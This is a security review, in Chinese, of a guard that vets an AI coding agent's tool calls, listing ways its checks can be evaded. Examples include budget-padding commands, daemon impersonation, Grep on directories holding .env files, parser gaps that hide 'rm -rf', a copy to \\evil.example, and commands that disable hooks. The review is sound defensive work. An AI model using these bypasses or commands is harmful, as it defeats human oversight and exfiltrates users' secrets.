# M1 + M1b 合并 X1 安全审查

审查对象：标签 `m1-done`（972bd38..88dfbaa）与 `m1b-done`（e275107..5453af0），仓库 HEAD `5453af0`，工作区干净。
环境：Windows 11 家庭中文版（build 26200）、Windows PowerShell 5.1、Python 3.12.11、Claude Code VS Code 扩展 2.1.301（只读了它的二进制里的字符串，没有运行）。**没有 pwsh 7，Docker 守护进程未运行（没有真 bash 做差分），没有创建符号链接的权限（只测了联接点与硬链接）。** 凡依赖这些的结论都写"未实测"。

## 0. 方法与可信度说明

- 审查者：我（主审）加四个只读子审查者（A：Bash 解析与路径；B：PowerShell 归一化；C：PowerShell 辅助进程与守护进程降级；D：基础设施与闸门）。子审查者没有写文件的权限，报告以文本交回。
- **每条发现标注证据等级**：
  - **［主审复现］**：我自己在一次性沙箱里重跑过，输出是我看到的。
  - **［子审查者实测］**：子审查者报告它在隔离环境里实测，我没有重跑；其中我能用代码阅读佐证的，写明"代码阅读佐证"。
  - **［代码阅读］**：只读了代码，没有跑。
- 所有实验都在 `SP\sandbox`（假 home、假项目、假"项目外"目录，里面只有 CANARY 文本）与各审查者自己的子目录里做；`SP` 指本次会话的临时目录。命令一律只"解析"（经 `pipeline.review` / `Daemon.handle` / 真实辅助进程），没有执行任何被审查的 shell 或 PowerShell 命令。守护进程与 `init` 只在隔离 home（`BOUNDKEEP_HOME`、`USERPROFILE`、`CLAUDE_CONFIG_DIR` 都指向临时目录）里启动。审查结束后核对：`git status` 为空；真实 `~\.boundkeep` 的最近修改时间仍是 2026-10-12；仓库里没有 10:00 之后新增或修改的文件；没有残留进程。一个子审查者做"假管道服务器"实验时被安全分类器拦下，它没有重试，并停掉了自己启动的所有进程（它自己的说明，我核对了没有残留进程）。
- 规模（子审查者自报，我没有逐条复核）：A 约 8700 个 shell 变体、约 300 个路径变体、93 个 URL 变体、3 万条随机命令；B 约 1900 个 PowerShell 变体加 9000 条随机行、7356 个参数缩写与真实 `ResolveParameter` 对照；C、D 各数十个实验。我自己约 250 个用例。**没有一条 Bash 或 PowerShell 命令在默认策略或 strict 策略下得到 `allow`**（A 报告 8667 例；我的用例里同样没有）。唯一得到 `allow` 的误判都来自非 shell 工具（Grep/Glob/Read，见 H-1、M-9）。
- 与本报告并列的辅助材料（不是仓库的一部分）：`SP\h.py`（harness）、`SP\M\*.json`（我的用例）、`SP\A|B|C|D\`（子审查者的脚本和原始输出）。

## 1. 对照规格 §4 的不变量，一张总表

| 不变量 | 结果 |
|---|---|
| 失败即关闭（任何出错、超时、解析失败降级为 ask，绝不静默放行） | 大体成立：hook 客户端在 C 的降级矩阵里（空输入、坏 JSON、GBK 字节、孤立代理项、NaN、超深嵌套、64MiB+ stdin、守护进程缺席/忙/超时、策略文件损坏/缺失/是目录/BOM/超大、审计日志被锁）全部以退出码 0/2 加 ask 结束。**例外**：M-3（`_fail_safe` 的参数 bug，ConfigChange 不再被拦）、H-2（同用户进程冒充守护进程，客户端听从 `allow`）、M-1（预算耗尽丢命令，方向是 deny→ask） |
| hook 异常时退出码只能是 0 或 2 | 所有实测路径满足 |
| 不确定即灰色，shell 命令永不自动 allow | 满足（8667 例无 shell allow）。但"灰色"在 M3 之后会交给 LLM，所以 M-1、M-8、M-9 这类"deny 被降成灰色"的发现在 M3 之后性质会升级 |
| 不替用户做决定（allow 默认返回无决定） | 守护进程一侧满足；**客户端不验证**，见 H-2 |
| 命名管道只授予当前用户 | DACL 本身正确（D 用原始 ctypes 读出：只有当前用户 SID，没有 Everyone / Authenticated Users / ANONYMOUS / SYSTEM / Administrators；远程访问返回 5）。但"只授予当前用户"包含"创建管道实例"的权限，见 H-2 |
| 闸门被悄悄关闭必须能被 `init` 自检与 `doctor` 发现 | **不满足**：H-3（项目级安装 + 在别处打开会话）没有任何机制能发现；D-2/D-4 的若干配置层也发现不了 |
| boundkeep 不是沙箱，不暗示强隔离 | 文档层面满足；但"默认只靠 audit-only 日常使用"（M-13）等于日常零防护 |

---

# 2. 发现（高严重度在最前）

严重度含义：**高**＝一个本应被拦的动作变成 `allow`（静默放行），或闸门静默失效，或 hook 客户端的 fail-closed 被打破；**中**＝应该 deny 的动作只得到 ask/灰色，或可靠的拒绝服务，或误导性的确认文本；**低**＝其余。"受影响的不变量"指规格 §4 与 CLAUDE.md "不可违反的原则"。

## H-1（高）Grep / Glob 以目录为目标时判为 `allow`，而目录里有受保护文件

- **证据**：［主审复现］＋［子审查者 A 独立复现］＋Claude Code 实现来自二进制字符串阅读。
- **受影响的不变量**：`no-secret-read` 的目的（"Grep must not be a way around Read"，default.yaml 自己的测试注释）；T4 数据外传的前置条件。
- **惰性复现**（`SP\M\m1.json`、`SP\A\repro.json`；项目里放 `.env`、`certs\a.pem`、`infra\terraform.tfstate`，内容是 CANARY）：

  ```json
  [{"tool":"Grep","input":{"pattern":".","path":"{PROJ}"}},
   {"tool":"Grep","input":{"pattern":"CANARY"}},
   {"tool":"Grep","input":{"pattern":"CANARY","path":"{PROJ}","glob":".e?v"}},
   {"tool":"Grep","input":{"pattern":"CANARY","path":"{PROJ}","glob":"*.env"}},
   {"tool":"Grep","input":{"pattern":"CANARY","path":"{PROJ}","glob":".env"}}]
  ```
- **实际观察**：前四条 `allow rules=read-inside-project`；第五条（精确的 `.env`）`deny no-secret-read`。对照：`Read {PROJ}\.env` → deny。同一个目录若里面有 `*.pem`、`*.tfstate`、`credentials.json`、`*.key`、`*.tfvars`，A 观察同样 `allow`（这些不是隐藏文件，ripgrep 不管 `--hidden` 与否都会读，M1 报告第 6 节只讨论了"隐藏文件"那一半）。
- **Claude Code 的实现**：我在 2.1.301 的 `claude.exe` 里读到 Grep 工具的参数构造：`Le=["--hidden"]`，随后 `--glob "!<版本控制目录>"`、`--max-columns 500`，用户的 deny 权限规则变成 `--iglob`。也就是说 **`--hidden` 是开的**，M1 报告第 6 节的"不知道 Claude Code 的 Grep 是否加 --hidden"现在有答案了：加。ripgrep 仍会按 `.gitignore` 跳过被忽略的文件（只在 git 仓库里生效）。所以实际可利用的条件是：秘密文件没有被 `.gitignore` 覆盖，或项目不是 git 仓库，或文件不是被忽略的名字。**我没有做端到端的真 Claude Code 运行**（那等于真的执行 Grep 工具）；"Claude Code 会返回 `.env` 内容"这一步是 ripgrep 语义加字符串阅读的推论，不是我看到的输出。
- **原因**：`event.py` 的 `_search_action`（约 1197–1227 行，A 定位）只为 `path` 与字面拼接的 `dir/<glob>` 生成路径引用；`glob` 里的通配符被当作字面量（`glob_literal`），目录本身从不展开。`path_inside_project` 对目录路径成立 → `read-inside-project` 命中。
- **严重度理由**：`emit_allow` 默认 false 时 `allow` 的意思是"无决定"，由 Claude Code 自己的权限流程接手，而 Grep 在项目内本来就免确认，所以结果是**无提示地读到秘密**，而且是单个标准工具调用，不需要任何技巧。条件（秘密未被忽略）使它不是"必然"，所以我标"高（有条件）"。
- **建议修复**：对目录目标的 Grep/Glob 不要在没有遍历子树的情况下给 `allow`：要么有界地遍历（受预算）并把命中受保护名字的文件加入读路径，要么让这类动作变灰色。`glob` 参数用 `paths.expand_glob` 展开。缺省 `path` 按 cwd 目录处理。顺带把 `.env` 与 `*.env`、`.claude/settings.local.json`、`.mcp.json` 等并入保护名单（见 M-11）。
- **是否需要改规格**：§7 加一句："目录目标的读类动作，只有在确认其子树不含受保护路径时才可 allow"。

## H-2（高，有条件）同一用户的进程可以冒充守护进程，客户端会照单执行 `allow`，`doctor` 看不出来

- **证据**：［子审查者 D 实测］；我用代码阅读佐证了两个关键前提（见下），**没有重跑冒充实验**（它和被分类器拦下的那类实验同类，我没有再做）。
- **受影响的不变量**：不替用户做决定（"allow 默认不输出"只在守护进程一侧成立）；失败即关闭；规格 §5.1 / `docs/architecture.md` 的"随机令牌防止名称抢占"。
- **D 的实测**：
  - 守护进程运行中，同一用户的另一个进程用同名再创建一个管道实例（没有首实例标志的要求）：40 次金丝雀 hook 调用得到 `deny 37、allow 3`；停掉冒充者后 `deny 10`。冒充者回答 `allow` 时客户端输出 `permissionDecision":"allow"`、退出码 0。
  - 守护进程启动前就占住管道名：`boundkeep serve` 响亮地失败（退出码 1，"the pipe … already exists"），但此后客户端对冒充者说话；冒充者用同样的私有 DACL 与拒绝远程标志时，`doctor` 报 `[ OK ] daemon: running`、`[ OK ] pipe-acl`。
  - 冒充者给出畸形回答（错 id、70KB、2001 字符的理由、`defer`、无换行、垃圾）都被客户端降成 `ask`；只有合法的 `allow`/`none` 会被听从。
- **我的代码阅读佐证**：`winsec.py:732` 给当前用户的 ACE 是 `FA`（FILE_ALL_ACCESS，含"创建管道实例"权限）；`FILE_FLAG_FIRST_PIPE_INSTANCE` 只约束第一次创建；`protocol.py:55` 的 `DECISIONS` 包含 `allow`，`decode_response` 接受它，`hook_main.process` 在 `kind == pre` 时直接渲染。
- **前提**：有一个同用户进程在跑。典型来源：用户点过一次"允许"的、会派生后台进程的灰色命令（`python x.py`、PowerShell 脚本）。boundkeep 规格把"已被攻陷的本机"列为范围外，所以我标"有条件"；但这里的问题不是"攻击者能做什么"，而是"一旦有了同用户进程，之后**每个**工具调用的 deny/ask 都可以被悄悄改成 allow，且不留审计记录"——比杀掉守护进程（那样得到的是 ask）更糟。
- **建议修复**（由便宜到贵）：
  1. 客户端在 `emit_allow` 未开启时把 `allow` 映射成"无决定"或 `ask`（守护进程默认从不发 `allow`，所以这是零成本的）。
  2. 创建完所有实例后收紧管道 DACL，去掉"创建实例"位（`FILE_APPEND_DATA` 0x4）。
  3. 客户端用 `GetNamedPipeServerProcessId` 对照 `serve.pid` 与解释器镜像（纵深防御）。
- **是否需要改规格**：是。§5.1 / architecture.md 的"令牌防抢占"只对其他用户成立；§3 范围外要写明"同一用户的进程可以冒充守护进程"，并把修复 1 写成客户端不变量。

## H-3（高，有条件）会话在项目的上一级（或别的）目录打开时，项目级安装完全不生效，没有任何告警

- **证据**：手工验收里真实踩到（`docs/manual-acceptance-m1b.md:63,239`）；［子审查者 D 实测］：`doctor --project-dir <项目>` 通过，`--project-dir <上级>` 与 `<项目>\src` 报 FAIL（所以 `doctor` 只对"被告知的目录"正确）；代码阅读：全仓库没有 SessionStart hook，`init` 与 `doctor` 的默认目录都是 cwd（`cli.py:61`、`doctor.py:810`），`check_activity`（`doctor.py:718`）只是 INFO。
- **受影响的不变量**：CLAUDE.md "闸门被悄悄关闭……所以 `init` 自检与 `doctor` 检查不是可选项"；规格 §10 最后一行。
- **后果**：那个会话里每条命令直接执行，连 ask 都没有，用户看到的只是"`.env` 不存在"一类看起来像失败的报错。项目级安装是 `init` 的默认。
- **建议修复**：
  1. 加一个 SessionStart hook，把 `cwd` / `CLAUDE_PROJECT_DIR` 报给守护进程；`doctor` 与 CLI 提示"最近 N 分钟没有任何带 hook 的会话"。
  2. `init` 默认改为用户级，或在项目级安装时明确打印"只对在 `<项目路径>` 里打开的会话生效"。
  3. 对 `doctor` 的 `check_workspace_trust` 也要带上 `CLAUDE_CONFIG_DIR`（D 发现它固定读 `~/.claude.json`，`doctor.py:619`）。
- **是否需要改规格**：§10 最后一行补"hook 配置层与会话目录不匹配"的检测要求。
- **我把它标为高的理由与保留意见**：它不是代码缺陷，而是机制缺口；它已经在真实验收里发生过一次。若你认为"项目级安装 + 文档提示"已足够，可以降为中；我的立场是：一个被设计成"失败即关闭"的闸门，不应该有一种已被观察到的、零提示的整体失效方式。

---

## M-1（中；进入 M3 之前必须修）预算耗尽把"出问题的命令"和"之后所有命令"整个丢掉，deny 降成灰色

- **证据**：［主审复现］＋A、B 独立复现。
- **不变量**：规格 §7 合并规则（"任一 deny → deny"）在预算耗尽时被破坏；M1 报告声称"预算超限返回灰色而不是异常"——它确实不放行，但丢掉了本该 deny 的命令。
- **复现**（`SP\M\perf1.py`、`SP\M\m9.json`、`SP\A\repro2.json`）：
  ```
  300 x "true;"  然后 cat .env                       -> gray  [budget:actions]   （255 个 "true;" 然后 cat .env -> deny）
  300 x "ls;"    然后 cat .env                       -> gray  （我测得 455 ms）
  Get-Content p0 p1 … p63 ~\.ssh\id_rsa              -> gray  [budget:disk-lookups]  （约 270 字节）
  Get-Content p0 … p63; reg add HKCU\Software\X      -> gray  （连不需要路径的规则也失效）
  cd /c/Windows && rm -rf *                           -> gray  [budget:disk-lookups]  （对照 rm -rf /c/Windows/* -> deny）
  ```
  我自己测的对照：`Get-Content ~\.ssh\id_rsa p0 … p63`（秘密在前）在我的沙箱里也是 gray（B 报告它是 deny，两次结果不同；原因是触发预算的那个命令整体被丢弃，所以 64 个不同路径加一个秘密词都在同一条命令里时，顺序不决定结果）。
- **原因**：`event.py` 的 `_shell_actions`（约 1106–1145）在 `_BudgetExceeded` 时丢掉已构建一半的命令动作，只追加一个灰色动作并返回，后面的命令不再分类；`_Budget.disk_slot`（144–148）；`MAX_DISK_KEYS=64`、`MAX_ACTIONS=256`、`TIME_BUDGET_S=0.25`。
- **现状下的影响**：用户仍会看到 ask，但原因文本里没有秘密的踪迹；而且 `cd /c/Windows && rm -rf *` 是**无恶意**也会触发的。**一旦 M3 把灰色交给 LLM，这就是一个可以靠 270 字节填充打开的真绕过。**
- **建议修复**：预算停止后，对剩余命令（和触发预算的那条命令）继续做**纯词法**分类（不展开通配符、不查磁盘），deny/ask 规则仍按词法路径匹配；通配符匹配数与磁盘查询预算分开计。
- **规格**：在 M1 的不变量里加"预算耗尽不得使已可见的 deny 变弱"。

## M-2（中）规则匹配（`evaluate`）没有预算；一条普通长度的命令就能让守护进程超过 2 秒的期限，deny 被超时降成 ask，并拖慢其他请求

- **证据**：［主审复现］（自己测的数字）＋A、C 独立测量。
- **复现**（`SP\M\perf2.py`、`perf3.py`；只做解析，不执行）：`cat` 加 N 个由 60 段、每段 500 字符组成的路径（深路径，规范化便宜，规则匹配贵）：

  | 命令大小 | 路径数 | normalize | evaluate | 判决 |
  |---|---|---|---|---|
  | 293 KiB | 10 | 48 ms | **2876 ms** | gray |
  | 998 KiB | 34 | 143 ms | **11040 ms** | gray |

  另一个形状（`cat` 一个 30000 字符的路径）单个 `Read` 要 322 ms。A、C 测得更小的输入就够：808 字节的 `cd a && ` ×100 加 `cat .env` 在 `normalize` 约 110 ms，`evaluate` 约 920 ms；`"cd a; "*1000 + "echo"`（6 KB）约 1.6–2.0 s；"256 × cat 4 个路径"（3.3 KB）约 1.7 s；600 条 60 段路径（140 KB）经 `Daemon.handle` 要 2153 ms，返回 `ask | review took too long`——**同一命令里含 `.env` 时本该是 deny**。C 在真实守护进程上：12 个并发恶意请求时良性 Read 探针延迟中位数 1688 ms、最大 5653 ms（基线约 4 ms），93 个里 3 个触发 2 秒超时；40 并发时管道池（8 个实例）饱和，客户端得到 busy/timeout，全部降成 ask。
- **原因**：`TIME_BUDGET_S` 只覆盖 `normalize_event`；`policy.evaluate`（35 条规则、约 200 个 glob，其中 89 个以 `/**` 结尾因而没有后缀预检）没有任何预算，按"动作 × 路径 × glob"的积运行，且在池线程里占着 GIL；超时的线程不能被取消，4 个 stuck 之后所有请求直接回答 busy 的 ask。
- **方向**：永远是 ask，从不 allow。但它（a）让 deny 变成 ask，（b）在 enforce 模式下可以被一条命令反复触发而让整个闸门不可用——而 `docs` 推荐用户此时切 `audit-only`，见 M-13。
- **建议修复**：给 `evaluate` 一个工作量预算（路径 × glob 次数，超限即灰色）；按 key 记忆化；限制每个请求的总 key 字符数；规则按"后缀预检"重排。

## M-3（中）`hook_client.py` 的 `_fail_safe` 读错了参数位置：`hook_main` 导入失败时，ConfigChange 不被拦（退出码 0 而不是 2）

- **证据**：［主审复现，在隔离副本里］；代码阅读（`hook_client.py:35–46`）。
- **不变量**：CLAUDE.md "hook 客户端……ConfigChange 的降级是阻断"；`hook_main.py` 文档字符串。
- **复现**：把仓库 `src\boundkeep` 复制到临时目录，在副本的 `hook_main.py` 末尾追加 `raise ImportError(...)`，然后按 Claude Code 的方式启动 `python -I -S <副本>\hook_client.py --home <临时home> <sub>`，stdin 给一个事件（`SP\E`）。
- **观察**：`config`、`pre`、`post`、`prompt` **全部**输出同一条 PreToolUse 形状的 ask JSON 并退出 0。`config` 应当是退出码 2；`post`/`prompt` 不应输出 PreToolUse 形状的 JSON。
- **原因**：`init` 自 M1 起总是把 `--home <路径>` 写进 hook 命令，于是 `sys.argv[1]` 是 `--home`，`_fail_safe` 里的 `sub == "config"` 永远不成立。`hook_main.main` 自己是会跳过 `--home` 的，所以只有导入失败这条兜底路径错。
- **影响**：触发条件是 `hook_main` 无法导入（升级到一半、缓存损坏、或有人改坏了它，见 M-4）。此时 PreToolUse 全部变 ask（正确），但 ConfigChange 不再能阻止 `disableAllHooks` 一类的改动——恰好是该路径要保证的事。
- **建议修复**：在 `_fail_safe` 里跳过 `--home <路径>` 再取子命令；加一个带 `--home` 的测试。同时（D 的建议）把 `sys.path.insert(0, _SRC_ROOT)` 改成 `append`：`-I -S` 下它把包根放在标准库之前，包根里的 `json.py` 会遮蔽标准库。

## M-4（中）守护闸门自己的代码、解释器与整个 `.claude`/`~/.claude` 目录没有 deny 规则，也没有完整性校验

- **证据**：［主审复现］（Write/Edit/重定向到 `hook_main.py`、`hook_client.py`、`.venv\Scripts\python.exe` 全是 gray）＋D、B、C 独立观察。
- **受影响的不变量**：规格 §3 T3（防护被关闭或持久化）。
- **观察**：
  - 对 `hook_main.py`、`hook_client.py`、`policy\loader.py`、虚拟环境与基础解释器的 `python.exe`、`boundkeep-hook.exe`、`policies\default.yaml`：Write / Edit / `Set-Content` / `>>` 全部 `gray`（D）。`protect-guard-config` 只覆盖 `settings*.json` 与 `.boundkeep/**`。`doctor` 的自检用四个样例事件，行为正常的木马通过；`installs.json` 里没有哈希。
  - 整个目录的操作：`Rename-Item ~\.claude x`、`Move-Item ~\.claude …`、`Remove-Item -Recurse .claude`、`mv ~/.claude …`、`robocopy <空目录> .claude /mir` 都是 gray；对照 `Rename-Item ~\.boundkeep x` 是 `deny protect-guard-config`（我复现了这对）。`rm -r ~\.claude` 只是因为 `rm-outside-project` 才被 deny。strict 里这些是 ask，不是 deny。
  - 在当前默认流程里，这些写入都至少是 ask（没有 shell 或 Write 的 allow 规则），所以它们削弱的是"deny 的保证"，不是"静默放行"。
- **建议修复**：像 `pipeline._config_dir_rules` 那样加运行时 deny 规则，覆盖包目录、hook 脚本、`init` 记录的解释器、策略源文件；把 `**/.claude`、`~/.claude`、`~/.boundkeep` 目录本身并入写保护（含删除、改名、移动）；`installs.json` 记录 sha256，`doctor` 与守护进程启动时校验。

## M-5（中）boundkeep 自己的命令行与"关闭闸门"类命令只有 gray

- **证据**：［主审复现］＋C、D 独立观察。
- **复现**（默认策略，Bash 与 PowerShell 一样）：`boundkeep mode audit-only`、`python -m boundkeep mode audit-only`、`boundkeep uninstall`、`boundkeep init --reset-policy`、`boundkeep log --purge`、`boundkeep init --python <任意exe>`、`boundkeep serve`、`pip uninstall -y boundkeep`、`claude config set -g disableAllHooks true`、`claude --dangerously-skip-permissions`、`taskkill /F /IM python.exe`、`Stop-Process -Name python`、`pkill -f boundkeep` → 全部 `gray`（= ask，没有规则命中）。`wmic process … delete` 因为 `wmic` 在持久化规则里才是 ask。
- **说明**：`boundkeep mode audit-only` 由 boundkeep 进程自己写策略文件，所以 `protect-guard-config` 的路径规则看不到它。确认框里不显示 boundkeep 的理由（M0 验收已知），用户只看到一条陌生命令。
- **建议修复**：`program: [boundkeep, boundkeep-hook]` 加 `subcommand: [mode, uninstall, init, log, serve]` 的 deny；`claude` 的 `config`、`--settings`、`--dangerously-skip-permissions` 加 ask。

## M-6（中）ConfigChange 与 `init` 对"削弱闸门"的配置不够严；`doctor` 只对含 boundkeep hook 的层做环境检查

- **证据**：［子审查者 D 实测］（`init` 一项我另用代码阅读佐证：`cli.py:110` 只调用 `merge_hooks`，不调用 `disables_hooks` / `find_suspicious_top_level_keys` / `env_violation`；这三个只出现在 `doctor.py`）。
- **D 观察**：
  - **被正确拦下**：`disableAllHooks` 取 true / "false" / 1 / 0；hook 被删、清空、改名、matcher 收窄、timeout 1、`async`、`if`、`shell`；`env` 里的 `USERPROFILE`/`HOME*`/`BOUNDKEEP_*`/`CLAUDE_CONFIG_DIR`；非法 JSON、注释、尾逗号、重复键、NaN、UTF-16、空文件、>4 MiB。
  - **没有被拦、`doctor` 也沉默**：`permissions.allow ["Bash(*)","PowerShell(*)","Write(*)"]`、`defaultMode: bypassPermissions`、`skipDangerousModePermissionPrompt`；会执行命令的键 `statusLine`、`apiKeyHelper`、`awsAuthRefresh`、`processWrapper`；`env` 里的 `PATH`、`PATHEXT`、`COMSPEC`、`NODE_OPTIONS`、`CLAUDE_CODE_GIT_BASH_PATH`、`ANTHROPIC_BASE_URL`、`PSModulePath`、`PYTHON*`、`CLAUDE_PROJECT_DIR`；第二个外来 PreToolUse hook；BOM 与多余的顶层键（规格 §10 点名的情形，`doctor` 对多余键完全不报，对 BOM 与错位的事件键只给警告）。
  - **`init` 在 `{"disableAllHooks": true}`、`{"foo":1,"PreToolUse":[]}`、`{"env":{"BOUNDKEEP_HOME":…}}` 的项目 settings 上成功退出（rc 0），打印 `hook entries: add …`，不给任何警告。**
  - `doctor` 只对含 boundkeep hook 的层应用 `env_violation`（`doctor.py:452`）：用户层的 `env.USERPROFILE`、本地层的 `env.BOUNDKEEP_HOME` 都得到 rc 0。（这两个因为 `--home` 钉住是低危。）
- **未测**：Claude Code 真实如何对待这些键（#98662、BOM、`bypassPermissions` 下 hook 的 ask 是否仍生效、其他 hook 的 `updatedInput`），都未测。
- **建议修复**：`init` 合并后跑 `doctor` 的层检查并警告或拒绝；ConfigChange 把上面的键纳入阻断（或至少 ask）；`_RISKY_ENV_NAMES` 扩充；BOM、未知顶层键与未知事件名按失败即关闭处理；`doctor` 对所有层跑同一组检查。

## M-7（中）同一用户的 8 个空闲管道连接就能让每一个 hook 等约 10 秒后变成 ask

- **证据**：［子审查者 D 实测］，我没有重跑。
- **观察**：基线 0.04–0.05 s；8 个沉默连接：`[2.03, 9.73, 9.73, 9.73, 9.72, 9.75]` s，其中 5 个 ask 是 `daemon is busy and did not accept the request in time`；32 个沉默连接约 9.75 s；8 或 32 个"滴灌"连接（1 字节后沉默）6 个全部 busy，9.73–10.14 s。攻击者一停，守护进程立刻恢复，没有崩溃（85.6 万次失败的打开之后仍正常）。
- **原因**：固定 8 个管道实例；客户端轮询 0.5–20 ms；首字节超时 1 s、读超时 5 s（`client.py:82–98`、`named_pipe.py:85`、`base.py:21`）。
- **方向**：fail-closed（ask），但把"每次工具调用多等 10 秒、没有保护的 Read 也变成提示"变成一个 DoS。建议：每次 accept 补建一个新实例；限制每个对端 PID 的连接数；缩短首字节期限。
- 代码阅读（未跑）：同用户进程持有 `serve.lock`（`lifecycle.py:82–95`）会让守护进程起不来。

## M-8（中）"消费型"程序把凭据文件当"只写"，所以不命中读取 deny；加上 Read 的 allow，形成"先 ask、再静默读"的两步

- **证据**：［主审复现，`SP\M\m8.json`：`git mv .env x.txt`、`gzip -k .env`、`zstd -o x.zst .env`、`git add -f .env` 全是 gray；`Read x.txt` → allow］＋A 的完整清单。
- **清单（A）**：`gzip -k`、`bzip2 -k`、`xz -k`、`zstd`、`git mv`、`git add [-f]`、`git update-index --add`、`git stash push`、`git rm [--cached]`、`git checkout-index`、`rsync --remove-source-files`。对 `~/.ssh/id_rsa`，同样的命令只得到 `ask-ssh-write`（而且理由文本说"写入 .ssh 会改变谁能登录"，实际是读私钥——误导性文本）。对照：`mv`、`cp`、`ln`、`install`、`dd if=`、`tar -cf`、`zip` 都是 deny。
- **两步后果**：`git mv .env x.txt` 只是 ask（用户点同意），之后 `Read x.txt` 是 `allow`（项目内、不是受保护文件名）。硬链接 `ln id_rsa 项目内路径` 本身被 deny；但项目里已有的硬链接读取是 allow（M1 报告已列为已知）。
- **建议修复**：`programs.py` 里把这些程序的源操作数 access 设为 `unknown`（既可能读也可能写，deny 侧"可能匹配即匹配"）。

## M-9（中）递归读取祖先目录与 `rev:path` 形式读取只有 gray

- **证据**：［主审复现：`tar czf`/`zip -r` 的整个 home、`grep -r . ~`、`find … -exec cat {} +`、`git show HEAD:.env` 都 gray］＋A、B 的完整清单。
- **清单**：`grep -r SECRET .`、`rg [--hidden] SECRET`、`tar cf - ~`、`zip -r x.zip .`、`cp -r . /tmp/x`、`rsync -a ./ /tmp/x/`、`find . -type f -exec cat {} +`、`ls -R ~`、`git log -p`、`git show HEAD`、`git grep SECRET`、`git stash show -p`、**`git show HEAD:.env`、`git cat-file -p HEAD:.env`、`git show :.env`、`git archive HEAD .env`**（这几条点名了秘密文件，仍只是 gray；`git log -p -- .env`、`git diff .env`、`git blame .env` 则被 deny）。PowerShell 一侧：`Compress-Archive -Path ~`、`xcopy ~ h /s /e /h`、`tar cf x.tar ~` 没有任何灰色原因（B-04），文档的缺口 8 只提到 `gci | gc`。`scp -r ~ host:/x` 只由 `net-allowlist` 问，理由文本不提上传。
- **建议修复**：给目录引用一个"递归"标记，匹配器检查它下面是否有受保护名字（与 H-1 的遍历是同一件事）；解析 `rev:path` 操作数。

## M-10（中）解析器与真实 bash 的分歧：`coproc`、`time { … }`、`eval --`、嵌套深度，把 `rm -rf` 藏成 gray

- **证据**：［主审复现，`SP\M\m8.json`：`coproc X { rm -rf OUT; }`、`time { rm -rf OUT; }`、`eval -- rm -rf OUT` 都 gray，对照 `rm -rf OUT` deny］＋A 的更多样例（`eval eval eval eval rm -rf`、四层 `bash -c`、18 层 `nice` 包装）。
- **原因**（A 定位）：`bash.py` 的 `_parse_simple`/`_keyword` 对 `coproc` 只跳过关键字，`NAME` 被当成命令、`{` 被当成参数；`time` 被当成包装器而不是保留字，所以后面的 `{` 不是复合语句的开头；`eval` 把 `--` 并进了递归的文本；`max_depth=3` 对 LLM 常写的形式偏小。
- **影响**：只丢 deny（得到 ask），不放行。**未对真 bash 做差分**（Docker 守护进程没开），所以"还有没有别的分歧"没有被排除。
- **建议修复**：把 `time` 和 `coproc [NAME]` 当关键字重启命令解析；`eval` 去掉前导 `--`；深度上限提高（已有全局词预算）。

## M-11（中）项目内的 Read / Grep 对若干"实际会放凭据"的文件是 `allow`

- **证据**：［主审复现，`SP\M\m6.json`］＋A-009。
- **`allow`（Read，项目内）**：`.claude\settings.local.json`（常放 `env` 里的令牌与 API 密钥，国内网关用户尤其常见）、`.mcp.json`（MCP 服务器的 `headers` 与 `env`）、`.claude\settings.json`、`.git\credentials`、`docker-compose.yml`、`key.txt`、`id_rsa.bak`、`ENV`、`prod.env`、`secrets.yml`、`.htpasswd`、`kubeconfig`、`local.settings.json`、`.kdbx`。**被 deny 的**：`.env` 与全部大小写、尾随点/空格、ADS、`\\?\`、`\\.\`、`\\localhost\c$`、MSYS 路径、`file://`、`src/..` 变体、`.env.*`、`.npmrc`、`.git\config`、`*.tfstate`。
- **项目外（gray，不是 allow）**：A-009 列出 `~/.config/git/credentials`、`~/.codex/auth.json`、`~/.gemini/oauth_creds.json`、`~/.config/github-copilot/hosts.json`、`~/.huggingface/token`、`~/.password-store`、`~/.local/share/keyrings`、浏览器/Slack/Discord 存储、VS Code `globalStorage\state.vscdb`——没有规则，ask 而已。
- **建议修复**：把项目内这几类并入 `no-secret-read`/`no-agent-state-read`；`*.env` 与 `.claude/settings.local.json`、`.mcp.json` 尤其。

## M-12（中）PowerShell 的 UNC / WebDAV 路径不被当作联网，`Copy-Item` 到 `\\evil.example\s\x` 没有任何灰色原因

- **证据**：［主审复现：`Get-Content \\evil.example\s\x`、`Copy-Item .\src\a.py \\evil.example\s\a.py` 都 `gray=[]`，规则列表为空］＋B-05（还有 `\\evil.example@80\DavWWWRoot\x`、`Test-Path \\192.0.2.1\s\x`）。
- **影响**：访问这类路径会泄露 NTLM 哈希，复制就是外传；`net-allowlist` 完全看不到。文档缺口 7 把它说轻了。灰色/ask 只是因为没有任何规则命中。
- **建议修复**：把 `\\host\share` 与 WebDAV 形式的路径填入 `domains`，打 `network_egress`。

## M-13（中，设计层）日常推荐 `audit-only`，而 `audit-only` 不防护任何东西

- **证据**：［子审查者 C 实测］（`mode: audit-only` 下危险的 ssh 密钥 Read 与良性 echo **都**得到空输出）；M1 与 M1b 报告都建议日常使用 `audit-only`。
- **说明**：enforce 下"没有 shell allow 规则"意味着每条普通命令都问；而 M-2、M-7 又提供了让 enforce 不可用的廉价手段。两者合起来的现实是：**要么不防护（audit-only），要么每条都点确认**。这不是代码缺陷，但它决定了闸门在日常里的真实价值。这里要明确说，不是美化：M2 评测之前，应当把"在 enforce 下可日常使用"当作一个必须达成的目标（allow 规则或 LLM），否则 boundkeep 的防护在默认配置里等于零。
- **需要改规格**：§6 / 核心承诺里补这一条。

---

## 低严重度（简列，每条的出处在括号里）

- **L-1** `evaluate()` 之外的另一个 DoS：≤512 字节的 PowerShell 小输入就能超过 0.3 秒预算（C-1）。`("{data" + "{"*5) * 51`（510 字节）触发 306–315 ms 超时并杀掉辅助进程；`data{` 家族 512 B→1024 B→1536 B 约 257 → 1461 → 4399 ms，是超线性的；每个不同的变体都绕开哈希缓存与节流，各花一次重启。**与文档的差异**：文档写重启约 1.8–2.3 秒，C 在本机测得 0.5–0.6 秒（B 测得约 0.8 秒），我没有复现文档的数字；重启窗口内 PowerShell 命令全是 gray，Bash 与 Read 不受影响（C 实测，Bash/Read 保持几十毫秒）。B 另指出 0.3 秒预算在加载中的机器上会随机超时（2000 字节的输入一次超时、空闲时 81 ms），报告从未测过负载。
